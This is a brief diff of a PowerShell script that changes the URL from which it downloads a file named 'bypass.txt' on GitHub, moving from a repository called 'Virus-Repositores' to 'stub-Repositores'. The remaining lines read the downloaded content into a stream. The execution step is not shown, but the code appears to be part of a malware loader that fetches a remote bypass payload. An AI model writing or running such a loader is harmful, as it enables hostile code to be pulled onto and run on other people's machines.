@@ -1,4 +1,4 @@
-$webreq = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/INotGreen/Virus-Repositores/main/bypass.txt')
+$webreq = [System.Net.WebRequest]::Create('https://raw.githubusercontent.com/INotGreen/stub-Repositores/main/bypass.txt')
 $resp=$webreq.GetResponse()
 $respstream=$resp.GetResponseStream()
 $reader=[System.IO.StreamReader]::new($respstream)
